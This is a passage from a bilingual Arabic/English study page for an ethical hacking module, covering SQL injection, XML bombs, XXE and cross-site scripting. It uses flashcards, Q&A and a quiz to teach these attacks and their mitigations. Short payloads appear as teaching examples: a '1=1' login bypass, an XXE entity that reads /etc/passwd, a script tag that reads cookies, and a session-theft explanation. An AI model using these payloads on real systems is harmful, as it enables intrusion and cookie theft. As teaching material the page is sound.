+  <text x="400" y="265" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="15" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Victim (Client)</text>
+  <text x="400" y="265" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="15" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">الضحية (العميل)</text>
+
+  <!-- Website Node -->
+  <rect x="620" y="175" width="140" height="110" rx="8" fill="var(--bg-elevated)" stroke="var(--border-color)" stroke-width="2" />
+  <!-- Website Icon (Server) -->
+  <rect x="665" y="195" width="50" height="14" rx="2" fill="none" stroke="var(--text-primary)" stroke-width="2" />
+  <rect x="665" y="213" width="50" height="14" rx="2" fill="none" stroke="var(--text-primary)" stroke-width="2" />
+  <circle cx="675" cy="202" r="2" fill="var(--brand-500)" />
+  <circle cx="675" cy="220" r="2" fill="var(--brand-500)" />
+  <!-- Website Label -->
+  <text x="690" y="265" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="15" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Vulnerable Website</text>
+  <text x="690" y="265" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="15" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">الموقع الضعيف</text>
+
+  <!-- Step Labels & Descriptions -->
+  
+  <!-- Step 1 -->
+  <circle cx="255" cy="100" r="12" fill="var(--brand-500)" />
+  <text x="255" y="105" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--on-brand-lo)">1</text>
+  <text x="255" y="125" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Sends malicious link</text>
+  <text x="255" y="125" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">يرسل رابطاً خبيثاً</text>
+  <text x="255" y="145" text-anchor="middle" font-family="monospace" font-size="12" fill="var(--brand-ink)">?name=&lt;script&gt;...</text>
+
+  <!-- Step 2 -->
+  <circle cx="545" cy="100" r="12" fill="var(--brand-500)" />
+  <text x="545" y="105" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--on-brand-lo)">2</text>
+  <text x="545" y="125" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Clicks link, requests page</text>
+  <text x="545" y="125" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">ينقر الرابط، يطلب الصفحة</text>
+  <text x="545" y="145" text-anchor="middle" font-family="monospace" font-size="12" fill="var(--brand-ink)">GET /welcome.cgi</text>
+
+  <!-- Step 3 -->
+  <circle cx="545" cy="365" r="12" fill="var(--brand-500)" />
+  <text x="545" y="370" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--on-brand-lo)">3</text>
+  <text x="545" y="390" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Reflects malicious script</text>
+  <text x="545" y="390" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">يعكس السكربت الخبيث</text>
+  <text x="545" y="320" text-anchor="middle" font-family="monospace" font-size="12" fill="var(--brand-ink)">Echo: &lt;script&gt;...</text>
+
+  <!-- Step 4 -->
+  <circle cx="255" cy="365" r="12" fill="var(--brand-500)" />
+  <text x="255" y="370" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--on-brand-lo)">4</text>
+  <text x="255" y="390" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--text-primary)" class="gsvg-en">Executes script, sends cookies</text>
+  <text x="255" y="390" text-anchor="middle" font-family="system-ui, 'Cairo', 'Inter', sans-serif" font-size="14" font-weight="bold" fill="var(--text-primary)" class="gsvg-ar">ينفذ السكربت، يرسل ملفات الارتباط</text>
+  <text x="255" y="320" text-anchor="middle" font-family="monospace" font-size="12" fill="var(--brand-ink)">document.cookie</text>
+
+</svg>
+</div>
+
+  <table class="comparison-table">
+    <thead><tr><th></th><th>Input Filtering</th><th>Output Filtering</th></tr></thead>
+    <tbody>
+      <tr>
+        <td data-bilingual>
+          <template class="content-ar">وقت التطبيق</template>
+          <template class="content-en">Time of Application</template>
+          <span class="content-target"></span>
+        </td>
+        <td class="td-good" data-bilingual>
+          <template class="content-ar">عند استلام البيانات من المستخدم</template>
+          <template class="content-en">When data is received from the user</template>
+          <span class="content-target"></span>
+        </td>
+        <td class="td-good" data-bilingual>
+          <template class="content-ar">عند إرسال البيانات مرة أخرى للمتصفح</template>
+          <template class="content-en">When data is sent back to the browser</template>
+          <span class="content-target"></span>
+        </td>
+      </tr>
+      <tr>
+        <td data-bilingual>
+          <template class="content-ar">حالة الاستخدام المثلى</template>
+          <template class="content-en">Best Use Case</template>
+          <span class="content-target"></span>
+        </td>
+        <td class="td-good" data-bilingual>
+          <template class="content-ar">البيانات التي تنعكس فوراً في الاستجابة</template>
+          <template class="content-en">Data reflected immediately in response</template>
+          <span class="content-target"></span>
+        </td>
+        <td class="td-good" data-bilingual>
+          <template class="content-ar">البيانات المسترجعة من قاعدة البيانات</template>
+          <template class="content-en">Data retrieved from a database</template>
+          <span class="content-target"></span>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+
+  <details class="thinking-question">
+    <summary data-bilingual>
+      <template class="content-ar">لماذا يعتبر استخدام دالة <code>alert()</code> شائعاً جداً عند إثبات وجود ثغرة XSS؟</template>
+      <template class="content-en">Why is using the <code>alert()</code> function so common when demonstrating an XSS vulnerability?</template>
+      <span class="content-target"></span>
+    </summary>
+    <div data-bilingual>
+      <template class="content-ar"><p>لأنه إذا كان من الممكن استدعاء دالة <code>alert()</code> بنجاح، فهذا يثبت أن المتصفح ينفذ كود Javascript المحقون، مما يعني أن استدعاءات أكثر خطورة مثل <code>window.open</code> لسرقة ملفات تعريف الارتباط ستنجح أيضاً. إنها طريقة سهلة ومرئية لاكتشاف النجاح.</p></template>
+      <template class="content-en"><p>Because if the <code>alert()</code> function can be called successfully, it proves the browser is executing the injected Javascript, meaning more dangerous calls like <code>window.open</code> to steal cookies will also succeed. It's an easy, visual way to detect success.</p></template>
+      <div class="content-target"></div>
+    </div>
+  </details>
+</section>
+
+<section id="professor" class="professor-card glass-card fade-up">
+  <div class="professor-header">
+    <i class="fa-solid fa-user-graduate sec-icon" aria-hidden="true"></i>
+    <h2 data-i18n="prof.title">حديث البروفيسور</h2>
+  </div>
+  <div class="professor-text" data-bilingual>
+    <template class="content-ar">أهلاً بكم يا شباب في هذه المراجعة السريعة والمركزة. في هذه الوحدة، ننتقل من الدفاع النظري إلى فهم كيف يفكر المهاجمون، وهو جوهر 'الاختراق الأخلاقي'. تذكروا دائماً للامتحان: الاختراق الأخلاقي قانوني ومصرح به، هذا هو الخط الفاصل. ركزوا بشدة على الثغرات الثلاث الكبرى التي ناقشناها: حقن SQL (حيث نخدع قاعدة البيانات بأوامر مثل <code>--</code> و <code>'1=1'</code>)، وحقن XML (سواء قنابل XML التي تسبب حجب الخدمة، أو XXE التي تسرق الملفات)، والبرمجة عبر المواقع XSS (حيث نستهدف متصفح المستخدم الآخر وليس الخادم نفسه). في XSS، افهموا جيداً الفرق بين تصفية المدخلات وتصفية المخرجات، وكيف يمكن للمهاجم الهروب من سياق HTML. أخيراً، لا تنسوا 'تضخم المكتبات'؛ فكل كود إضافي لا تحتاجه هو باب خلفي محتمل للمهاجمين. راجعوا أمثلة الكود جيداً، وتأكدوا من فهم كيفية التخفيف من كل ثغرة. بالتوفيق!</template>
+    <template class="content-en">Welcome everyone to this quick, focused review. In this module, we shift from theoretical defense to understanding how attackers think, which is the core of 'Ethical Hacking'. Always remember for the exam: ethical hacking is legal and authorized, that's the dividing line. Focus heavily on the big three vulnerabilities we discussed: SQL Injection (where we trick the DB with commands like <code>--</code> and <code>'1=1'</code>), XML Injection (both XML Bombs causing DoS, and XXE stealing files), and Cross Site Scripting XSS (where we target another user's browser, not the server itself). For XSS, thoroughly understand the difference between input and output filtering, and how an attacker can escape an HTML context. Finally, don't forget 'Library Bloat'; every piece of extra code you don't need is a potential backdoor for attackers. Review the code examples carefully, and make sure you understand how to mitigate each vulnerability. Good luck!</template>
+    <div class="content-target"></div>
+  </div>
+</section>
+
+<section id="ask-professor" class="fade-up section-gap">
+  <h2><i class="fa-solid fa-circle-question sec-icon" aria-hidden="true"></i> <span data-i18n="ask.title">اسأل البروفيسور</span></h2>
+  <div class="accordion">
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">ما هي الآلية الأساسية التي يعتمد عليها هجوم حقن SQL؟</template>
+          <template class="content-en">What is the fundamental mechanism that an SQL injection attack relies on?</template>
+          <span class="content-target">ما هي الآلية الأساسية التي يعتمد عليها هجوم حقن SQL؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">يعتمد على أخذ مدخلات المستخدم من نموذج ويب واستخدامها حرفياً (بدون تعقيم أو معلمات) في بناء استعلام SQL، مما يسمح للمدخلات بتغيير منطق الاستعلام.</template>
+          <template class="content-en">It relies on taking user input from a web form and using it literally (without sanitization or parameterization) in the construction of an SQL query, allowing the input to alter the query's logic.</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">كيف تتسبب قنبلة XML في هجوم حجب الخدمة (DoS)؟</template>
+          <template class="content-en">How does an XML Bomb cause a Denial of Service (DoS) attack?</template>
+          <span class="content-target">كيف تتسبب قنبلة XML في هجوم حجب الخدمة (DoS)؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">تستخدم قنبلة XML كيانات متداخلة تشير إلى بعضها البعض. عندما يقوم محلل XML بتوسيع هذه الكيانات المضمنة، فإنها تنمو بشكل هندسي (أسي)، مما يستهلك كل الذاكرة أو وحدة المعالجة المركزية المتاحة ويتسبب في تعطل التطبيق.</template>
+          <template class="content-en">An XML Bomb uses nested entities that reference each other. When the XML parser expands these inline entities, they grow geometrically (exponentially), consuming all available memory or CPU and causing the application to crash.</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">ما هو الهدف الرئيسي لهجوم إفشاء الكيانات الخارجية (XXE)؟</template>
+          <template class="content-en">What is the main goal of an XXE Disclosure attack?</template>
+          <span class="content-target">ما هو الهدف الرئيسي لهجوم إفشاء الكيانات الخارجية (XXE)؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">الهدف هو إجبار محلل XML على قراءة ملفات النظام المحلية (مثل /etc/passwd) أو التفاعل مع أنظمة داخلية أخرى وتسريب هذه المعلومات الحساسة للمهاجم.</template>
+          <template class="content-en">The goal is to force the XML parser to read local system files (like /etc/passwd) or interact with other internal systems and leak this sensitive information to the attacker.</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">كيف يمكن للمطورين التخفيف من هجمات XXE في تطبيقات .NET؟</template>
+          <template class="content-en">How can developers mitigate XXE attacks in .NET applications?</template>
+          <span class="content-target">كيف يمكن للمطورين التخفيف من هجمات XXE في تطبيقات .NET؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">عن طريق تكوين إعدادات محلل XML لتجنب حل المراجع الخارجية تماماً، وذلك بتعيين خاصية <code>XmlResolver</code> إلى القيمة <code>null</code>.</template>
+          <template class="content-en">By configuring the XML parser settings to avoid resolving external references entirely, specifically by setting the <code>XmlResolver</code> property to <code>null</code>.</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">لماذا يعتبر تضخم المكتبات (Library Bloat) مشكلة أمنية؟</template>
+          <template class="content-en">Why is Library Bloat considered a security issue?</template>
+          <span class="content-target">لماذا يعتبر تضخم المكتبات (Library Bloat) مشكلة أمنية؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">لأن تضمين مكتبات غير ضرورية يزيد من مساحة الهجوم (Attack Surface). قد تحتوي هذه المكتبات غير المستخدمة على ثغرات أمنية يمكن للمهاجمين استغلالها لاختراق التطبيق.</template>
+          <template class="content-en">Because including unnecessary libraries increases the Attack Surface. These unused libraries may contain vulnerabilities that attackers can exploit to compromise the application.</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">ما الذي يميز الاختراق الأخلاقي عن الأنشطة الخبيثة؟</template>
+          <template class="content-en">What distinguishes ethical hacking from malicious activities?</template>
+          <span class="content-target">ما الذي يميز الاختراق الأخلاقي عن الأنشطة الخبيثة؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">الشرعية والإذن. المخترقون الأخلاقيون يعملون بإذن صريح من مالك النظام، ولا يتسببون في أضرار، ويقومون بالإبلاغ عن الثغرات بدلاً من استغلالها لسرقة البيانات.</template>
+          <template class="content-en">Legality and permission. Ethical hackers operate with explicit permission from the system owner, cause no damage, and report vulnerabilities instead of exploiting them to steal data.</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">من هم الأطراف الثلاثة المعنيون في هجوم البرمجة عبر المواقع (XSS)؟</template>
+          <template class="content-en">Who are the three parties involved in a Cross Site Scripting (XSS) attack?</template>
+          <span class="content-target">من هم الأطراف الثلاثة المعنيون في هجوم البرمجة عبر المواقع (XSS)؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">المهاجم (الذي يكتب الكود الخبيث)، موقع الويب الضعيف (الذي يعكس الكود)، والعميل أو الضحية (الذي ينفذ متصفحه الكود الخبيث).</template>
+          <template class="content-en">The attacker (who writes the malicious code), the vulnerable web site (which echoes the code), and the client or victim (whose browser executes the malicious code).</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">في هجوم XSS، لماذا يستخدم المهاجمون غالباً كود <code>window.open</code> مع <code>document.cookie</code>؟</template>
+          <template class="content-en">In an XSS attack, why do attackers often use <code>window.open</code> code with <code>document.cookie</code>?</template>
+          <span class="content-target">في هجوم XSS، لماذا يستخدم المهاجمون غالباً كود <code>window.open</code> مع <code>document.cookie</code>؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">لفتح نافذة أو اتصال بخادم يسيطر عليه المهاجم، وإرسال ملفات تعريف الارتباط (cookies) الخاصة بالضحية كمعلمة في الرابط، مما يسمح للمهاجم بسرقة الجلسة وانتحال شخصية الضحية.</template>
+          <template class="content-en">To open a window or connection to an attacker-controlled server, sending the victim's cookies as a URL parameter, which allows the attacker to steal the session and impersonate the victim.</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">ما هو الفرق بين تصفية المدخلات وتصفية المخرجات في الحماية من XSS؟</template>
+          <template class="content-en">What is the difference between input filtering and output filtering in XSS protection?</template>
+          <span class="content-target">ما هو الفرق بين تصفية المدخلات وتصفية المخرجات في الحماية من XSS؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">تصفية المدخلات تنظف البيانات بمجرد استلامها من المستخدم قبل معالجتها. تصفية المخرجات تنظف البيانات في اللحظة التي يتم فيها إرسالها مرة أخرى إلى المتصفح للعرض (مهم جداً للبيانات المخزنة في قاعدة البيانات).</template>
+          <template class="content-en">Input filtering cleans the data as soon as it is received from the user before processing. Output filtering cleans the data at the moment it is sent back to the browser for display (crucial for data stored in a database).</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+    <div class="accordion-item">
+      <button class="accordion-trigger">
+        <span data-bilingual>
+          <template class="content-ar">كيف يمكن لجدار حماية تطبيقات الويب (WAF) المساعدة في منع هجمات XSS؟</template>
+          <template class="content-en">How can a Web Application Firewall (WAF) help prevent XSS attacks?</template>
+          <span class="content-target">كيف يمكن لجدار حماية تطبيقات الويب (WAF) المساعدة في منع هجمات XSS؟</span>
+        </span>
+        <i class="fa-solid fa-chevron-down chevron"></i>
+      </button>
+      <div class="accordion-body">
+        <div class="accordion-body-inner" data-bilingual>
+          <template class="content-ar">يعمل WAF كطرف ثالث يعترض الطلبات قبل وصولها إلى خادم الويب. يقوم بفحص جميع المدخلات (بما في ذلك المسارات والرؤوس) بحثاً عن أنماط HTML و Javascript الخبيثة المعروفة ويرفض الطلبات المشبوهة.</template>
+          <template class="content-en">A WAF acts as a third party that intercepts requests before they reach the web server. It inspects all inputs (including paths and headers) for known malicious HTML and Javascript patterns and rejects suspicious requests.</template>
+          <div class="content-target"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="flashcards" class="flashcard-section fade-up">
+  <h2><i class="fa-solid fa-clone sec-icon" aria-hidden="true"></i> <span data-i18n="fc.title">البطاقات التعليمية</span></h2>
+  <div id="fc-container"></div>
+</section>
+<script type="application/json" id="flashcard-data">
+[
+  {
+    "id": 1,
+    "front": {
+      "ar": "ما هو حقن SQL (SQL Injection)؟",
+      "en": "What is SQL Injection?"
+    },
+    "back": {
+      "definition": {
+        "ar": "ثغرة أمنية تسمح للمهاجم بالتدخل في الاستعلامات التي يجريها التطبيق على قاعدة بياناته.",
+        "en": "A vulnerability that allows an attacker to interfere with the queries an application makes to its database."
+      },
+      "example": {
+        "ar": "إدخال '1=1' في حقل تسجيل الدخول لتجاوز المصادقة.",
+        "en": "Entering '1=1' in a login field to bypass authentication."
+      }
+    }
+  },
+  {
+    "id": 2,
+    "front": {
+      "ar": "ما هو الرمز المستخدم للتعليقات في حقن SQL لتجاهل بقية الاستعلام؟",
+      "en": "What symbol is used for comments in SQL injection to ignore the rest of the query?"
+    },
+    "back": {
+      "definition": {
+        "ar": "الشرطتان المزدوجتان (--)",
+        "en": "Double dashes (--)"
+      },
+      "example": {
+        "ar": "SELECT * FROM <code>table</code> --",
+        "en": "SELECT * FROM <code>table</code> --"
+      }
+    }
+  },
+  {
+    "id": 3,
+    "front": {
+      "ar": "ما هو الغرض من قنبلة XML (XML Bomb)؟",
+      "en": "What is the purpose of an XML Bomb?"
+    },
+    "back": {
+      "definition": {
+        "ar": "التسبب في تعطل محلل XML أو تنفيذه بشكل غير صحيح، مما يؤدي إلى هجوم حجب الخدمة (DoS).",
+        "en": "To cause the XML parser to crash or execute incorrectly, resulting in a Denial of Service (DoS) attack."
+      },
+      "example": {
+        "ar": "استغلال التوسع المضمن للكيانات لاستهلاك الذاكرة.",
+        "en": "Exploiting inline entity expansion to consume memory."
+      }
+    }
+  },
+  {
+    "id": 4,
+    "front": {
+      "ar": "ما هو إفشاء الكيانات الخارجية (XXE Disclosure)؟",
+      "en": "What is XXE Disclosure?"
+    },
+    "back": {
+      "definition": {
+        "ar": "ثغرة يقوم فيها محلل XML بتسريب معلومات حساسة عن طريق معالجة كيانات خارجية غير موثوقة.",
+        "en": "A vulnerability where the XML parser leaks sensitive information by processing untrusted external entities."
+      },
+      "example": {
+        "ar": "&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;",
+        "en": "&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;"
+      }
+    }
+  },
+  {
+    "id": 5,
+    "front": {
+      "ar": "كيف يتم التخفيف من هجمات XXE في .NET؟",
+      "en": "How are XXE attacks mitigated in .NET?"
+    },
+    "back": {
+      "definition": {
+        "ar": "عن طريق تعيين XmlResolver إلى null لتجنب حل المراجع الخارجية.",
+        "en": "By setting XmlResolver to null to avoid resolving external references."
+      },
+      "example": {
+        "ar": "settings.XmlResolver = null;",
+        "en": "settings.XmlResolver = null;"
+      }
+    }
+  },
+  {
+    "id": 6,
+    "front": {
+      "ar": "كيف يتم التخفيف من هجمات XXE في PHP؟",
+      "en": "How are XXE attacks mitigated in PHP?"
+    },
+    "back": {
+      "definition": {
+        "ar": "باستخدام الدالة libxml_disable_entity_loader(true).",
+        "en": "By using the function libxml_disable_entity_loader(true)."
+      },
+      "example": {
+        "ar": "libxml_disable_entity_loader(true);",
+        "en": "libxml_disable_entity_loader(true);"
+      }
+    }
+  },
+  {
+    "id": 7,
+    "front": {
+      "ar": "ما هو تضخم المكتبات (Library Bloat)؟",
+      "en": "What is Library Bloat?"
+    },
+    "back": {
+      "definition": {
+        "ar": "مكتبات يتم الإعلان عنها أو استخدامها في البرنامج النصي للبناء ولكنها غير ضرورية لتنفيذ التطبيق.",
+        "en": "Libraries declared or used in the build script that are not necessary for executing the application."
+      },
+      "example": {
+        "ar": "تضمين مكتبة رسوميات ضخمة في تطبيق نصي فقط.",
+        "en": "Including a massive graphics library in a text-only application."
+      }
+    }
+  },
+  {
+    "id": 8,
+    "front": {
+      "ar": "ما هو تضخم الكود (Code Bloat)؟",
+      "en": "What is Code Bloat?"
+    },
+    "back": {
+      "definition": {
+        "ar": "إنتاج كود طويل بشكل غير ضروري، أو بطيء، أو يهدر الموارد.",
+        "en": "Production of code that is unnecessarily long, slow, or wasteful of resources."
+      },
+      "example": {
+        "ar": "كتابة 50 سطراً من الكود لمهمة يمكن إنجازها في سطرين.",
+        "en": "Writing 50 lines of code for a task that can be done in 2 lines."
+      }
+    }
+  },
+  {
+    "id": 9,
+    "front": {
+      "ar": "ما هو الاختراق الأخلاقي (Ethical Hacking)؟",
+      "en": "What is Ethical Hacking?"
+    },
+    "back": {
+      "definition": {
+        "ar": "استخدام أدوات وتقنيات القراصنة بشكل قانوني لتقييم أمن الأنظمة والإبلاغ عن الثغرات دون إحداث ضرر.",
+        "en": "Using hacker tools and techniques legally to evaluate system security and report bugs without causing damage."
+      },
+      "example": {
+        "ar": "اختبار اختراق مصرح به من قبل الشركة المالكة.",
+        "en": "An authorized penetration test requested by the owning company."
+      }
+    }
+  },
+  {
+    "id": 10,
+    "front": {
+      "ar": "ما هي البرمجة عبر المواقع (XSS)؟",
+      "en": "What is Cross Site Scripting (XSS)?"
+    },
+    "back": {
+      "definition": {
+        "ar": "هجوم على مستوى التطبيق يقوم فيه المهاجم بحقن نصوص برمجية في صفحات الويب التي يعرضها مستخدمون آخرون.",
+        "en": "An application-level attack where an attacker injects scripts into web pages viewed by other users."
+      },
+      "example": {
+        "ar": "حقن &lt;script&gt;alert(document.cookie)&lt;/script&gt; في رابط.",
+        "en": "Injecting &lt;script&gt;alert(document.cookie)&lt;/script&gt; into a link."
+      }
+    }
+  },
+  {
+    "id": 11,
+    "front": {
+      "ar": "من هم الأطراف الثلاثة المشاركون في هجوم XSS؟",
+      "en": "Who are the three parties involved in an XSS attack?"
+    },
+    "back": {
+      "definition": {
+        "ar": "المهاجم، العميل (الضحية)، وموقع الويب.",
+        "en": "The attacker, a client (victim), and the web site."
+      },
+      "example": {
+        "ar": null,
+        "en": null
+      }
+    }
+  },
+  {
+    "id": 12,
+    "front": {
+      "ar": "أين يتم تنفيذ هجوم XSS فعلياً؟",
+      "en": "Where does the XSS attack actually take place?"
+    },
+    "back": {
+      "definition": {
+        "ar": "في متصفح الضحية.",
+        "en": "At the victim's browser."
+      },
+      "example": {
+        "ar": null,
+        "en": null
+      }
+    }
+  },
+  {
+    "id": 13,
+    "front": {
+      "ar": "ما هي تصفية المدخلات (Input Filtering) في سياق XSS؟",
+      "en": "What is Input Filtering in the context of XSS?"
+    },
+    "back": {
+      "definition": {
+        "ar": "تصفية مدخلات المستخدم ضد علامات HTML وكود Javascript عند استلامها بواسطة البرنامج النصي.",
+        "en": "Filtering user input against HTML tags and Javascript code when it is received by a script."
+      },
+      "example": {
+        "ar": "إزالة علامات &lt;script&gt; من معلمة 'name'.",
+        "en": "Removing &lt;script&gt; tags from a 'name' parameter."
+      }
+    }
+  },
+  {
+    "id": 14,
+    "front": {
+      "ar": "ما هي تصفية المخرجات (Output Filtering) في سياق XSS؟",
+      "en": "What is Output Filtering in the context of XSS?"
+    },
+    "back": {
+      "definition": {
+        "ar": "تصفية بيانات المستخدم عند إرسالها مرة أخرى إلى المتصفح، بدلاً من وقت استلامها.",
+        "en": "Filtering user data when it is sent back to the browser, rather than when it is received."
+      },
+      "example": {
+        "ar": "تطبيق الفلتر قبل عرض البيانات المستخرجة من قاعدة البيانات.",
+        "en": "Applying the filter before presenting data retrieved from a database."
+      }
+    }
+  },
+  {
+    "id": 15,
+    "front": {
+      "ar": "كيف يمكن لجدار حماية تطبيقات الويب (WAF) منع XSS؟",
+      "en": "How can a Web Application Firewall (WAF) prevent XSS?"
+    },
+    "back": {
+      "definition": {
+        "ar": "يعترض الطلبات قبل وصولها للخادم ويفحص البيانات بحثاً عن أنماط HTML و Javascript الخبيثة ويرفضها.",
+        "en": "It intercepts requests before they reach the server, inspects data against malicious HTML/Javascript patterns, and rejects them."
+      },
+      "example": {
+        "ar": null,
+        "en": null
+      }
+    }
+  },
+  {
+    "id": 16,
+    "front": {
+      "ar": "هل يمكن تنفيذ XSS بدون استخدام علامة &lt;script&gt;؟",
+      "en": "Can XSS be executed without using the &lt;script&gt; tag?"
+    },
+    "back": {
+      "definition": {
+        "ar": "نعم، يمكن استخدام علامات HTML أخرى مثل &lt;img&gt;.",
+        "en": "Yes, other HTML tags like &lt;img&gt; can be used."
+      },
+      "example": {
+        "ar": "&lt;img src=\"javascript:...\"&gt;",
+        "en": "&lt;img src=\"javascript:...\"&gt;"
+      }
+    }
+  },
+  {
+    "id": 17,
+    "front": {
+      "ar": "ماذا يجب أن يفعل المهاجم إذا كانت البيانات محقونة داخل سياق HTML غير حر (مثل قيمة حقل إدخال)؟",
+      "en": "What must an attacker do if data is injected into a non-free HTML context (like an input field value)?"
+    },
+    "back": {
+      "definition": {
+        "ar": "يجب عليه 'الهروب' إلى السياق الحر أولاً عن طريق إغلاق العلامة السابقة.",
+        "en": "They must 'escape' to the free context first by closing the previous tag."
+      },
+      "example": {
+        "ar": "إضافة \"> قبل كود &lt;script&gt;.",
+        "en": "Adding \"> before the &lt;script&gt; code."
+      }
+    }
+  },
+  {
+    "id": 18,
+    "front": {
+      "ar": "كيف تقوم أدوات تقييم الثغرات الآلية بالتحقق من وجود XSS؟",
+      "en": "How do automated vulnerability assessment tools check for XSS?"
+    },
+    "back": {
+      "definition": {
+        "ar": "تقوم بالزحف إلى الموقع وإطلاق متغيرات من الحمولات ضد جميع البرامج النصية والمعلمات والرؤوس للتحقق مما إذا كان الكود ينعكس قابلاً للتنفيذ.",
+        "en": "They crawl the site and launch variants of payloads against all scripts, parameters, and headers to see if the code is reflected as executable."
+      },
+      "example": {
+        "ar": null,
+        "en": null
+      }
+    }
+  }
+]
+</script>
+
+<section id="quiz" class="quiz-section fade-up">
+  <h2><i class="fa-solid fa-list-check sec-icon" aria-hidden="true"></i> <span data-i18n="quiz.title">اختبر نفسك</span></h2>
+  <div class="quiz-progress"><div class="quiz-progress-fill" id="quiz-progress-fill"></div></div>
+  <div id="quiz-content" class="quiz-card glass-card">
+    <div class="quiz-header">
+      <span id="quiz-counter">1 / 10</span>
+      <span><i class="fa-solid fa-bullseye" aria-hidden="true"></i> <span data-i18n="quiz.score">نتيجتك</span>: <span id="quiz-score-live">0</span></span>
+    </div>
+    <div class="quiz-question" id="quiz-question-text"></div>
+    <div class="quiz-options" id="quiz-options-container"></div>
+    <button class="quiz-hint-btn" id="quiz-hint-btn" onclick="Garden.showQuizHint()"><i class="fa-solid fa-lightbulb" aria-hidden="true"></i> <span data-i18n="quiz.hint">تلميح</span></button>
+    <div class="quiz-feedback hidden" id="quiz-feedback"></div>
+    <div class="quiz-nav">
+      <div></div>
+      <button class="nav-btn hidden" id="quiz-next-btn" onclick="Garden.nextQ()">
+        <span data-i18n="quiz.next">التالي</span> <i class="fa-solid fa-arrow-left"></i>
+      </button>
+    </div>
+  </div>
+  <div id="quiz-results" class="quiz-results glass-card hidden">
